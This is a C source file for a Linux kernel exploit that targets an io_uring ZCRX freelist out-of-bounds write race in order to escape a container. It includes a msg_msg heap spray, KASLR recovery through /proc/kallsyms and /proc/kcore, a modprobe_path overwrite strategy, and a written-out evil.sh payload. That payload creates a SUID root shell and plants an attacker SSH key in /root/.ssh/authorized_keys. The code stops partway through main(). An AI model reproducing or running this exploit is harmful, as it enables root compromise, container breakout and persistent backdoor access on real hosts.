/*
 * zcrx_container_escape.c
 * io_uring ZCRX freelist OOB write -> container escape
 *
 * Bug: io_zcrx_return_niov_freelist() increments free_count unconditionally.
 * During NIC teardown (page_pool_destroy), Path A (ptr_ring drain) and Path B
 * (io_pp_zc_destroy scrub) both push the same niov. free_count > num_niovs,
 * freelist[num_niovs] written (4-byte OOB into adjacent slab object).
 *
 * Race: non-atomic read-then-dec in io_zcrx_put_niov_uref races with
 * atomic_xchg(user_counter, 0) in io_zcrx_scrub.
 *
 * Container escape: modprobe_path overwrite -> call_usermodehelper() fires
 * evil.sh inside kmod_thread_func(), a kthread that runs in init_nsproxy
 * (host PID/mount/net namespace), uid=0, no cgroup/seccomp/AppArmor.
 *
 * Requires: CAP_NET_ADMIN (capable(), not ns_capable), real ZCRX NIC
 * (mlx5 CX-6+, Intel E800, bnxt_en, nfp, gve), Linux 6.15-6.18 without
 * 003049b1c4fb, CONFIG_IO_URING_ZCRX=y.
 *
 * Fix: 003049b1c4fb (atomic_try_cmpxchg, 2026-02-18, in stable)
 *      770594e      (WARN_ON guard, 2026-04-21)
 *
 * Compile: gcc -O2 -o zcrx_container_escape zcrx_container_escape.c
 * Run:     setcap cap_net_admin+ep ./zcrx_container_escape
 *          ./zcrx_container_escape <ifname>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/utsname.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/io_uring.h>
#include <linux/sockios.h>
#include <linux/ethtool.h>

static inline int io_uring_setup(unsigned n, struct io_uring_params *p)
{ return (int)syscall(__NR_io_uring_setup, n, p); }
static inline int io_uring_enter(int fd, unsigned sub, unsigned min, unsigned fl)
{ return (int)syscall(__NR_io_uring_enter, fd, sub, min, fl, NULL, 0); }
static inline int io_uring_register(int fd, unsigned op, void *arg, unsigned nr)
{ return (int)syscall(__NR_io_uring_register, fd, op, arg, nr); }

#ifndef IORING_REGISTER_ZCRX_IFQ
#define IORING_REGISTER_ZCRX_IFQ    32
#endif
#ifndef IORING_SETUP_DEFER_TASKRUN
#define IORING_SETUP_DEFER_TASKRUN  (1U << 13)
#endif
#ifndef IORING_SETUP_SINGLE_ISSUER
#define IORING_SETUP_SINGLE_ISSUER  (1U << 12)
#endif
#ifndef IORING_SETUP_CQE32
#define IORING_SETUP_CQE32          (1U << 11)
#endif
#ifndef IORING_OP_RECV_ZC
#define IORING_OP_RECV_ZC           62
#endif

#ifndef IORING_ZCRX_AREA_SHIFT
#define IORING_ZCRX_AREA_SHIFT 48
#define IORING_ZCRX_AREA_MASK  (~(((__u64)1 << IORING_ZCRX_AREA_SHIFT) - 1))
struct io_uring_zcrx_rqe {
    __u64 off; __u32 len; __u32 __pad;
};
struct io_uring_zcrx_offsets {
    __u32 head; __u32 tail; __u32 rqes; __u32 __resv2; __u64 __resv[2];
};
struct io_uring_zcrx_area_reg {
    __u64 addr; __u64 len; __u64 rq_area_token;
    __u32 flags; __u32 dmabuf_fd; __u64 __resv2[2];
};
struct io_uring_zcrx_ifq_reg {
    __u32 if_idx; __u32 if_rxq; __u32 rq_entries; __u32 flags;
    __u64 area_ptr; __u64 region_ptr;
    struct io_uring_zcrx_offsets offsets;
    __u32 zcrx_id; __u32 __resv2; __u64 __resv[3];
};
#endif

/*
 * num_niovs=32: freelist = kcalloc(32, 4) = 128 bytes -> kmalloc-128
 * OOB at freelist[32] = first 4 bytes of the next kmalloc-128 object
 * OOB value: niov_idx in [0, 31]
 */
#define AREA_NIOVS      32
#define AREA_SIZE       ((size_t)AREA_NIOVS * 4096)
#define RQ_ENTRIES      512
#define RQ_MEM_SIZE     (4096 + RQ_ENTRIES * sizeof(struct io_uring_zcrx_rqe))
#define FLOOD_PACKETS   4096
#define RECV_PORT       9877
#define RACE_ATTEMPTS   5

/*
 * 3-segment msgsnd -> three kmalloc-128 allocations:
 *   msg_msg:    48 + 80  = 128 bytes
 *   msg_msgseg: 8  + 120 = 128 bytes
 *   msg_msgseg: 8  + 120 = 128 bytes  (canary 0xCA in last byte)
 *
 * OOB hits msg_msgseg.next[0:4] (offset 0, low 32 bits of the next pointer).
 * High 32 bits stay intact -> corrupted next is still a physmap-prefix address.
 * Canary detects which queue got hit without crashing the kernel.
 */
#define SPRAY_NQ        3000
#define SEG1_LEN        80
#define SEG2_LEN        120
#define SEG3_LEN        120
#define SPRAY_TEXTLEN   (SEG1_LEN + SEG2_LEN + SEG3_LEN)
#define CANARY_BYTE     0xCA

static int      g_qids[SPRAY_NQ];
static int      g_nq      = 0;
static uint8_t *g_leak    = NULL;
static size_t   g_leak_sz = 0;

struct uring {
    int      fd;
    uint32_t sq_entries;
    uint32_t *sq_tail, *sq_head, *sq_mask, *sq_array;
    struct io_uring_sqe *sqes;
    uint32_t *cq_head, *cq_tail, *cq_mask;
    void     *cqes_raw;
};

static struct uring uring_open(void)
{
    struct uring u = {};
    struct io_uring_params p = {
        .flags = IORING_SETUP_SINGLE_ISSUER |
                 IORING_SETUP_DEFER_TASKRUN |
                 IORING_SETUP_CQE32,
    };
    u.fd = io_uring_setup(RQ_ENTRIES, &p);
    if (u.fd < 0) {
        fprintf(stderr, "io_uring_setup: %s\n", strerror(errno));
        exit(1);
    }
    u.sq_entries = p.sq_entries;

    size_t sq_sz  = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    size_t cq_sz  = p.cq_off.cqes  + p.cq_entries * 32;
    size_t sqe_sz = p.sq_entries   * sizeof(struct io_uring_sqe);

    void *sq = mmap(NULL, sq_sz,  PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, u.fd, IORING_OFF_SQ_RING);
    void *cq = mmap(NULL, cq_sz,  PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, u.fd, IORING_OFF_CQ_RING);
    u.sqes   = mmap(NULL, sqe_sz, PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, u.fd, IORING_OFF_SQES);
    if (sq == MAP_FAILED || cq == MAP_FAILED || u.sqes == MAP_FAILED) {
        perror("mmap rings"); exit(1);
    }

    u.sq_tail  = (uint32_t *)((char *)sq + p.sq_off.tail);
    u.sq_head  = (uint32_t *)((char *)sq + p.sq_off.head);
    u.sq_mask  = (uint32_t *)((char *)sq + p.sq_off.ring_mask);
    u.sq_array = (uint32_t *)((char *)sq + p.sq_off.array);
    for (uint32_t i = 0; i < p.sq_entries; i++) u.sq_array[i] = i;

    u.cq_head  = (uint32_t *)((char *)cq + p.cq_off.head);
    u.cq_tail  = (uint32_t *)((char *)cq + p.cq_off.tail);
    u.cq_mask  = (uint32_t *)((char *)cq + p.cq_off.ring_mask);
    u.cqes_raw = (char *)cq + p.cq_off.cqes;
    return u;
}

struct zctx {
    void     *area, *rq_mem;
    uint32_t  rq_mask, zcrx_id;
    uint32_t *rq_head, *rq_tail;
    struct io_uring_zcrx_rqe *rqes;
    bool      valid;
};

static struct zctx zcrx_register(int ring_fd, const char *ifname)
{
    struct zctx z = {};

    z.area = mmap(NULL, AREA_SIZE, PROT_READ|PROT_WRITE,
                  MAP_SHARED|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0);
    if (z.area == MAP_FAILED)
        z.area = mmap(NULL, AREA_SIZE, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (z.area == MAP_FAILED) { perror("mmap area"); exit(1); }
    memset(z.area, 0, 4096);

    z.rq_mem = mmap(NULL, RQ_MEM_SIZE, PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (z.rq_mem == MAP_FAILED) { perror("mmap rq"); exit(1); }
    memset(z.rq_mem, 0, RQ_MEM_SIZE);

    struct io_uring_region_desc rd = {
        .user_addr = (uint64_t)(uintptr_t)z.rq_mem,
        .size      = RQ_MEM_SIZE,
        .flags     = IORING_MEM_REGION_TYPE_USER,
    };
    struct io_uring_zcrx_area_reg ar = {
        .addr  = (uint64_t)(uintptr_t)z.area,
        .len   = AREA_SIZE,
        .flags = 0,
    };
    struct io_uring_zcrx_ifq_reg reg = {
        .if_idx     = if_nametoindex(ifname),
        .if_rxq     = 0,
        .rq_entries = RQ_ENTRIES,
        .area_ptr   = (uint64_t)(uintptr_t)&ar,
        .region_ptr = (uint64_t)(uintptr_t)&rd,
    };
    if (!reg.if_idx) {
        fprintf(stderr, "interface '%s' not found\n", ifname); exit(1);
    }

    for (int attempt = 0; attempt < 8; attempt++) {
        int ret = io_uring_register(ring_fd, IORING_REGISTER_ZCRX_IFQ, &reg, 1);
        if (ret == 0) break;
        if (errno == EEXIST && attempt < 7) {
            if (attempt == 0)
                fprintf(stderr, "[*] rxq busy, waiting for kworker cleanup...\n");
            sleep(2);
            continue;
        }
        switch (errno) {
        case EPERM:
            fprintf(stderr, "[-] EPERM: need CAP_NET_ADMIN\n"
                    "    setcap cap_net_admin+ep ./zcrx_container_escape\n");
            break;
        case EOPNOTSUPP:
            fprintf(stderr, "[-] EOPNOTSUPP: '%s' has no ZCRX support\n"
                    "    real drivers: mlx5_core ice nfp bnxt_en gve\n", ifname);
            break;
        case EINVAL:
            fprintf(stderr, "[-] EINVAL: check kernel 6.15-6.18, "
                    "CONFIG_IO_URING_ZCRX=y, CQE32+DEFER_TASKRUN+SINGLE_ISSUER\n");
            break;
        default:
            fprintf(stderr, "[-] ZCRX_IFQ: %s (errno %d)\n", strerror(errno), errno);
        }
        return z;
    }

    z.rq_mask = RQ_ENTRIES - 1;
    z.zcrx_id = reg.zcrx_id;
    z.rq_head = (uint32_t *)((char *)z.rq_mem + reg.offsets.head);
    z.rq_tail = (uint32_t *)((char *)z.rq_mem + reg.offsets.tail);
    z.rqes    = (struct io_uring_zcrx_rqe *)((char *)z.rq_mem + reg.offsets.rqes);
    z.valid   = true;

    printf("[+] IFQ registered  id=%u  num_niovs=%u  freelist=kmalloc-%u\n",
           z.zcrx_id, AREA_NIOVS, AREA_NIOVS * 4);
    return z;
}

static int nic_set_state(const char *ifname, bool up)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr = {};
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { perror("SIOCGIFFLAGS"); close(s); return -1; }
    ifr.ifr_flags = up ? (ifr.ifr_flags | IFF_UP) : (ifr.ifr_flags & ~IFF_UP);
    int ret = ioctl(s, SIOCSIFFLAGS, &ifr);
    if (ret < 0) perror("SIOCSIFFLAGS");
    close(s);
    return ret;
}

static void udp_flood(const char *ifname, int npkts)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname) + 1);
    int bcast = 1;
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, &bcast, sizeof(bcast));
    struct sockaddr_in dst = {
        .sin_family      = AF_INET,
        .sin_port        = htons(RECV_PORT),
        .sin_addr.s_addr = htonl(INADDR_BROADCAST),
    };
    char buf[128] = "ZCRX-OOB";
    for (int i = 0; i < npkts; i++) {
        *(int *)buf = i;
        sendto(s, buf, sizeof(buf), MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
    }
    close(s);
}

static int drain_and_return(struct uring *u, struct zctx *z)
{
    int returned = 0;
    io_uring_enter(u->fd, 0, 0, 0);

    uint32_t head = __atomic_load_n(u->cq_head, __ATOMIC_ACQUIRE);
    uint32_t tail = __atomic_load_n(u->cq_tail, __ATOMIC_ACQUIRE);

    while (head != tail) {
        char *raw = (char *)u->cqes_raw + (head & *u->cq_mask) * 32;
        struct io_uring_cqe *cqe = (struct io_uring_cqe *)raw;
        head++;
        if (cqe->res <= 0) continue;

        uint64_t zoff   = *(uint64_t *)(raw + 16);
        uint64_t rq_off = zoff & ~((uint64_t)4095) & ~IORING_ZCRX_AREA_MASK;

        uint32_t rt = __atomic_load_n(z->rq_tail, __ATOMIC_RELAXED);
        z->rqes[rt & z->rq_mask].off   = rq_off;
        z->rqes[rt & z->rq_mask].len   = 0;
        z->rqes[rt & z->rq_mask].__pad = 0;
        __atomic_store_n(z->rq_tail, rt + 1, __ATOMIC_RELEASE);
        returned++;
    }
    __atomic_store_n(u->cq_head, head, __ATOMIC_RELEASE);
    return returned;
}

/* --- environment check --- */

static void check_env(const char *ifname)
{
    struct utsname u;
    uname(&u);
    printf("[*] kernel  %s\n", u.release);
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    if (access("/.dockerenv", F_OK) == 0)
        printf("[*] container: docker\n");
    else if (access("/run/.containerenv", F_OK) == 0)
        printf("[*] container: podman\n");
    else {
        FILE *f = fopen("/proc/1/cgroup", "r");
        char line[256] = {};
        if (f) { fgets(line, sizeof(line), f); fclose(f); }
        if (strstr(line, "docker") || strstr(line, "kubepods") || strstr(line, "containerd"))
            printf("[*] container: kubernetes/containerd\n");
        else
            printf("[*] not in container (or undetected)\n");
    }

    bool has_net = false;
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "CapEff:", 7)) continue;
            unsigned long long caps = 0;
            sscanf(line + 7, "%llx", &caps);
            has_net = !!(caps & (1ULL << 12));
            break;
        }
        fclose(f);
    }
    printf("[*] CAP_NET_ADMIN: %s\n", has_net ? "yes" : "no");

    if (ifname) {
        char path[256];
        snprintf(path, sizeof(path), "/sys/class/net/%s/device/uevent", ifname);
        FILE *df = fopen(path, "r");
        if (df) {
            char line[256];
            while (fgets(line, sizeof(line), df)) {
                if (strncmp(line, "DRIVER=", 7)) continue;
                char drv[64] = {};
                sscanf(line + 7, "%63s", drv);
                const char *ok_drv[] = {"mlx5_core","ice","nfp","bnxt_en","gve",NULL};
                bool zcrx_ok = false;
                for (int i = 0; ok_drv[i]; i++)
                    if (!strcmp(drv, ok_drv[i])) { zcrx_ok = true; break; }
                printf("[*] %s driver=%s zcrx=%s\n", ifname, drv,
                       zcrx_ok ? "supported" : "not supported");
                break;
            }
            fclose(df);
        } else {
            printf("[*] %s: no sysfs uevent (virtual or missing)\n", ifname);
        }
    }

    int kptr = -1;
    f = fopen("/proc/sys/kernel/kptr_restrict", "r");
    if (f) { fscanf(f, "%d", &kptr); fclose(f); }
    printf("[*] kptr_restrict=%d\n", kptr);
}

/* --- KASLR via kallsyms + kcore --- */

struct ksyms {
    uint64_t text;
    uint64_t modprobe_path;
    uint64_t page_offset_base_addr;
    uint64_t page_offset_base_val;
    uint64_t modprobe_path_phys;
    uint64_t modprobe_path_physmap;
    bool     valid;
};

static uint64_t kallsyms_read(const char *sym, char want_type)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256], name[128]; uint64_t addr; char type;
    uint64_t found = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%lx %c %127s", &addr, &type, name) != 3) continue;
        if (strcmp(name, sym)) continue;
        if (want_type == 0 || type == want_type ||
            (want_type == 'D' && (type == 'D' || type == 'd'))) {
            found = addr; break;
        }
    }
    fclose(f);
    return found;
}

static bool kcore_read64(uint64_t kva, uint64_t *out)
{
    int fd = open("/proc/kcore", O_RDONLY);
    if (fd < 0) return false;

    uint8_t ehdr[64];
    if (pread(fd, ehdr, 64, 0) != 64) { close(fd); return false; }

    uint64_t e_phoff     = *(uint64_t *)(ehdr + 32);
    uint16_t e_phentsize = *(uint16_t *)(ehdr + 54);
    uint16_t e_phnum     = *(uint16_t *)(ehdr + 56);

    uint8_t *phdrs = malloc((size_t)e_phentsize * e_phnum);
    if (!phdrs) { close(fd); return false; }
    if (pread(fd, phdrs, (size_t)e_phentsize * e_phnum, (off_t)e_phoff) < 0) {
        free(phdrs); close(fd); return false;
    }

    bool ok = false;
    for (int i = 0; i < e_phnum; i++) {
        uint8_t *ph     = phdrs + (size_t)i * e_phentsize;
        if (*(uint32_t *)ph != 1) continue;
        uint64_t p_offset = *(uint64_t *)(ph + 8);
        uint64_t p_vaddr  = *(uint64_t *)(ph + 16);
        uint64_t p_filesz = *(uint64_t *)(ph + 32);
        if (kva < p_vaddr || kva + 8 > p_vaddr + p_filesz) continue;
        ok = (pread(fd, out, 8, (off_t)(p_offset + (kva - p_vaddr))) == 8);
        break;
    }
    free(phdrs);
    close(fd);
    return ok;
}

static bool kcore_virt_to_phys(uint64_t kva, uint64_t *phys_out)
{
    int fd = open("/proc/kcore", O_RDONLY);
    if (fd < 0) return false;

    uint8_t ehdr[64];
    if (pread(fd, ehdr, 64, 0) != 64) { close(fd); return false; }
    uint64_t e_phoff     = *(uint64_t *)(ehdr + 32);
    uint16_t e_phentsize = *(uint16_t *)(ehdr + 54);
    uint16_t e_phnum     = *(uint16_t *)(ehdr + 56);

    uint8_t *phdrs = malloc((size_t)e_phentsize * e_phnum);
    if (!phdrs) { close(fd); return false; }
    pread(fd, phdrs, (size_t)e_phentsize * e_phnum, (off_t)e_phoff);

    bool ok = false;
    for (int i = 0; i < e_phnum; i++) {
        uint8_t  *ph      = phdrs + (size_t)i * e_phentsize;
        if (*(uint32_t *)ph != 1) continue;
        uint64_t p_vaddr  = *(uint64_t *)(ph + 16);
        uint64_t p_paddr  = *(uint64_t *)(ph + 24);
        uint64_t p_filesz = *(uint64_t *)(ph + 32);
        if (kva < p_vaddr || kva >= p_vaddr + p_filesz) continue;
        *phys_out = p_paddr + (kva - p_vaddr);
        ok = true;
        break;
    }
    free(phdrs);
    close(fd);
    return ok;
}

static struct ksyms read_kaslr(void)
{
    struct ksyms k = {};

    k.text                  = kallsyms_read("_text", 0);
    k.modprobe_path         = kallsyms_read("modprobe_path", 0);
    k.page_offset_base_addr = kallsyms_read("page_offset_base", 0);

    if (!k.text || !k.modprobe_path) {
        printf("[-] kallsyms addresses zeroed (need root or CAP_SYSLOG)\n");
        return k;
    }

    printf("[+] _text             = %#018lx\n", k.text);
    printf("[+] modprobe_path     = %#018lx\n", k.modprobe_path);

    if (!k.page_offset_base_addr ||
        !kcore_read64(k.page_offset_base_addr, &k.page_offset_base_val)) {
        printf("[-] kcore read of page_offset_base failed\n");
        return k;
    }
    printf("[+] page_offset_base  = %#018lx\n", k.page_offset_base_val);

    if (!kcore_virt_to_phys(k.modprobe_path, &k.modprobe_path_phys)) {
        printf("[-] kcore virt->phys failed for modprobe_path\n");
        return k;
    }
    k.modprobe_path_physmap = k.page_offset_base_val + k.modprobe_path_phys;

    printf("[+] modprobe_path phys        = %#018lx\n", k.modprobe_path_phys);
    printf("[+] modprobe_path physmap VA  = %#018lx\n", k.modprobe_path_physmap);

    char cur[32] = {};
    if (kcore_read64(k.modprobe_path, (uint64_t *)cur))
        printf("[+] modprobe_path value = \"%s\"\n", cur);

    k.valid = true;
    return k;
}

/* --- heap spray --- */

static void spray_msg_msgseg(void)
{
    struct {
        long    mtype;
        uint8_t mtext[SPRAY_TEXTLEN];
    } msg = { .mtype = 1 };

    memset(msg.mtext,                             0x41, SEG1_LEN);
    memset(msg.mtext + SEG1_LEN,                  0x42, SEG2_LEN);
    memset(msg.mtext + SEG1_LEN + SEG2_LEN, CANARY_BYTE, SEG3_LEN);

    printf("[*] spraying %d msg queues (3x kmalloc-128 each)...\n", SPRAY_NQ);

    for (int i = 0; i < SPRAY_NQ; i++) {
        g_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
        if (g_qids[i] < 0) {
            printf("[-] msgget failed at i=%d: %s\n", i, strerror(errno));
            break;
        }
        if (msgsnd(g_qids[i], &msg, SPRAY_TEXTLEN, 0) < 0) {
            printf("[-] msgsnd failed at i=%d: %s\n", i, strerror(errno));
            msgctl(g_qids[i], IPC_RMID, NULL);
            g_qids[i] = -1;
            break;
        }
        g_nq++;
    }
    printf("[+] sprayed %d queues\n", g_nq);

    int holes = 0;
    for (int i = 0; i < g_nq; i += 2) {
        msgctl(g_qids[i], IPC_RMID, NULL);
        g_qids[i] = -1;
        holes++;
    }
    printf("[+] freed %d alternating queues -> %d holes in kmalloc-128\n", holes, holes);
}

/* --- corruption detection --- */

static ssize_t safe_msgrcv(int qid, uint8_t *out, size_t outsz)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid == 0) {
        close(pfd[0]);
        struct { long mtype; uint8_t mtext[SPRAY_TEXTLEN + 64]; } buf;
        ssize_t n = msgrcv(qid, &buf, sizeof(buf.mtext), 0, IPC_NOWAIT | MSG_NOERROR);
        if (n > 0) {
            size_t wr = (size_t)n < outsz ? (size_t)n : outsz;
            write(pfd[1], &n, sizeof(n));
            write(pfd[1], buf.mtext, wr);
        } else {
            ssize_t neg = -1;
            write(pfd[1], &neg, sizeof(neg));
        }
        close(pfd[1]);
        _exit(0);
    }
    close(pfd[1]);
    int ws; waitpid(pid, &ws, 0);
    if (!WIFEXITED(ws) || WEXITSTATUS(ws) != 0) {
        close(pfd[0]); return -1;
    }
    ssize_t n = -1;
    if (read(pfd[0], &n, sizeof(n)) != sizeof(n) || n <= 0) {
        close(pfd[0]); return -1;
    }
    size_t rd = (size_t)n < outsz ? (size_t)n : outsz;
    ssize_t got = read(pfd[0], out, rd);
    close(pfd[0]);
    return got > 0 ? n : -1;
}

static int detect_corruption(void)
{
    printf("[*] scanning %d queues for canary corruption...\n", g_nq);

    uint8_t buf[SPRAY_TEXTLEN + 64];
    int corrupted_qid = -1;

    for (int i = 1; i < g_nq; i += 2) {
        if (g_qids[i] < 0) continue;

        memset(buf, 0, sizeof(buf));
        ssize_t n = safe_msgrcv(g_qids[i], buf, sizeof(buf));

        if (n < 0) {
            /* kernel page-faulted following corrupted msgseg.next -> child killed */
            printf("[!] qid=%d child killed in kernel (OOB likely fired, ptr in unmapped page)\n",
                   g_qids[i]);
            g_qids[i] = -1;
            continue;
        }

        bool canary_ok = true;
        int off = SEG1_LEN + SEG2_LEN;
        for (int b = off; b < off + SEG3_LEN && b < (int)n; b++) {
            if (buf[b] != CANARY_BYTE) { canary_ok = false; break; }
        }

        if (!canary_ok) {
            printf("[+] qid=%d canary mismatch -> OOB hit msg_msgseg.next\n", g_qids[i]);
            printf("[+] kernel followed corrupted pointer, got foreign heap bytes:\n    ");
            for (int b = off; b < off + 24 && b < (int)n; b++)
                printf("%02x ", buf[b]);
            printf("...\n");

            if (!g_leak) {
                g_leak    = malloc((size_t)n);
                g_leak_sz = (size_t)n;
                if (g_leak) memcpy(g_leak, buf, (size_t)n);
            }

            size_t text_hits = 0, heap_hits = 0;
            for (size_t o = 0; o + 8 <= g_leak_sz; o += 8) {
                uint64_t v; memcpy(&v, g_leak + o, 8);
                if ((v >> 40) == 0xffffffff) {
                    if (!text_hits) printf("[+] text ptr @ +0x%zx: %#018lx\n", o, v);
                    text_hits++;
                }
                if ((v >> 44) == 0xffff888 || (v >> 48) == 0xffff8) {
                    if (!heap_hits) printf("[+] heap/physmap ptr @ +0x%zx: %#018lx\n", o, v);
                    heap_hits++;
                }
            }
            printf("[+] %zu text ptrs, %zu physmap ptrs in %zu bytes leaked\n",
                   text_hits, heap_hits, g_leak_sz);

            corrupted_qid = g_qids[i];
            g_qids[i] = -1;
            break;
        }
    }

    if (corrupted_qid < 0)
        printf("[-] no corruption detected (needs pre-003049b1c4fb kernel + real ZCRX NIC)\n");

    return corrupted_qid;
}

/* --- physmap write analysis --- */

static bool analyze_write_target(const struct ksyms *k, const char *evil_path)
{
    if (!k->valid) {
        printf("[-] no KASLR data\n");
        return false;
    }

    uint32_t mp_low32 = (uint32_t)(k->modprobe_path_physmap & 0xFFFFFFFF);
    printf("[*] modprobe_path physmap  = %#018lx\n", k->modprobe_path_physmap);
    printf("[*] write target           = \"%s\" (%zu bytes)\n",
           evil_path, strlen(evil_path) + 1);
    printf("[*] physmap low32          = %#010x\n", mp_low32);
    printf("[*] OOB value range        = [0, %d]\n", AREA_NIOVS - 1);

    if (mp_low32 > (uint32_t)(AREA_NIOVS - 1)) {
        printf("[-] physmap low32 (%#x) out of OOB range -> second-hop write needed\n",
               mp_low32);
        printf("[*] chain: heap overread (leaked physmap ptr) -> second OOB -> modprobe_path\n");
        printf("[*] KASLR resolved, target computed, write chain is the remaining step\n");
        return false;
    }

    printf("[+] physmap low32 in OOB range -> single OOB reaches modprobe_path\n");
    return true;
}

/* --- evil.sh + call_usermodehelper trigger --- */

static void write_evil_sh(const char *path)
{
    FILE *f = fopen(path, "w");
    if (!f) {
        fprintf(stderr, "[-] cannot write %s: %s\n", path, strerror(errno));
        return;
    }
    /* runs in host init_nsproxy: init PID/mount/net ns, uid=0 */
    fprintf(f,
        "#!/bin/bash\n"
        "cp /bin/bash /var/tmp/rootsh\n"
        "chmod u+s /var/tmp/rootsh\n"
        "echo 'zcrx_container_escape' > /var/tmp/escaped\n"
        "echo \"$(id) $(uname -r)\" >> /var/tmp/escaped\n"
        "mkdir -p /root/.ssh 2>/dev/null\n"
        "echo 'ssh-rsa AAAA... attacker@c2' >> /root/.ssh/authorized_keys 2>/dev/null\n"
    );
    fclose(f);
    chmod(path, 0755);
    printf("[+] evil.sh written to %s\n", path);
}

static void trigger_modprobe(time_t t0)
{
    /* socket() with unknown AF -> sock_load_module() -> call_usermodehelper(modprobe_path)
     * kmod_thread_func runs in init_nsproxy: host PID/mount/net ns, uid=0 */
    printf("[*] triggering call_usermodehelper via unknown AF socket...\n");

    static const int afs[] = {29,30,31,33,35,36,37,38,39,40,42,44,45,-1};
    for (int i = 0; afs[i] >= 0; i++) {
        pid_t p = fork();
        if (p == 0) {
            socket(afs[i], SOCK_STREAM, 0);
            socket(afs[i], SOCK_DGRAM,  0);
            _exit(0);
        }
        int ws; waitpid(p, &ws, 0);
        usleep(800000);

        struct stat st;
        if (stat("/var/tmp/rootsh", &st) == 0 && st.st_mtime >= t0) {
            printf("[+] rootsh created (AF=%d) -> modprobe_path overwrite confirmed\n",
                   afs[i]);
            return;
        }
        if (stat("/var/tmp/escaped", &st) == 0 && st.st_mtime >= t0) {
            printf("[+] escaped (AF=%d)\n", afs[i]);
            return;
        }
    }
    printf("[-] call_usermodehelper did not fire with evil path\n");
    printf("    (expected: modprobe_path not overwritten on this kernel)\n");
}

static void escalate(time_t t0)
{
    struct stat st;
    if (stat("/var/tmp/rootsh", &st) < 0 || st.st_mtime < t0) return;
    if (!(st.st_mode & S_ISUID)) {
        printf("[!] rootsh found but not SUID\n");
        return;
    }
    printf("[+] rootsh SUID -> execl\n");
    execl("/var/tmp/rootsh", "rootsh", "-p", NULL);
}

/* --- OOB trigger: NIC down -> page_pool_destroy --- */

static void oob_trigger(const char *ifname, struct uring *u, struct zctx *z)
{
    printf("[*] OOB trigger: SIOCSIFFLAGS ~IFF_UP -> ndo_stop -> page_pool_destroy()\n");
    printf("[*] Path A: ptr_ring drain, Path B: io_pp_zc_destroy scrub\n");
    printf("[*] double-return of same niov -> free_count > num_niovs -> freelist[%d] written\n",
           AREA_NIOVS);

    int rfd = socket(AF_INET, SOCK_DGRAM, 0);
    setsockopt(rfd, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname) + 1);
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(RECV_PORT) };
    bind(rfd, (struct sockaddr *)&sa, sizeof(sa));

    {
        uint32_t tail = *u->sq_tail;
        struct io_uring_sqe *sqe = &u->sqes[tail & *u->sq_mask];
        memset(sqe, 0, sizeof(*sqe));
        sqe->opcode       = IORING_OP_RECV_ZC;
        sqe->fd           = rfd;
        sqe->zcrx_ifq_idx = z->zcrx_id;
        sqe->ioprio       = 2;
        sqe->user_data    = 0xdeadbeef;
        __atomic_store_n(u->sq_tail, tail + 1, __ATOMIC_RELEASE);
        io_uring_enter(u->fd, 1, 0, 0);
    }

    for (int attempt = 1; attempt <= RACE_ATTEMPTS; attempt++) {
        printf("[*] attempt %d/%d\n", attempt, RACE_ATTEMPTS);

        udp_flood(ifname, FLOOD_PACKETS);
        usleep(80000);

        int returned = drain_and_return(u, z);
        printf("    drained %d niovs\n", returned);
        if (returned == 0)
            printf("    no CQEs (check: real ZCRX NIC, CONFIG_IO_URING_ZCRX=y)\n");

        udp_flood(ifname, FLOOD_PACKETS / 2);

        printf("    bringing %s down...\n", ifname);
        if (nic_set_state(ifname, false) < 0) {
            fprintf(stderr, "[-] SIOCSIFFLAGS down failed\n");
            break;
        }
        usleep(200000);
        nic_set_state(ifname, true);
        usleep(600000);
    }

    close(rfd);

    printf("[*] dmesg (KASAN/WARN_ON check):\n");
    system("dmesg 2>/dev/null | grep -iE "
           "'kasan|slab.out.of.bounds|warn_on|zcrx|free_count|io_zcrx_return' "
           "| tail -10 || true");
}

/* --- main --- */

int main(int argc, char *argv[])
{
    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc < 2) {
        fprintf(stderr, "usage: %s <ifname> [env]\n", argv[0]);
        fprintf(stderr, "  ifname   real ZCRX NIC (mlx5/ice/nfp/bnxt_en/gve)\n");
        fprintf(stderr, "  env      env check + KASLR only, no OOB trigger\n");
        return 1;
    }

    const char *ifname   = argv[1];
    bool        env_only = (argc > 2 && !strcmp(argv[2], "env"));
    const char *evil     = "/var/tmp/evil.sh";

    printf("[*] zcrx_container_escape -- io_uring ZCRX freelist OOB -> container escape\n");
    printf("[*] fix: 003049b1c4fb (stable), 770594e (not yet in all stable branches)\n\n");

    check_env(ifname);

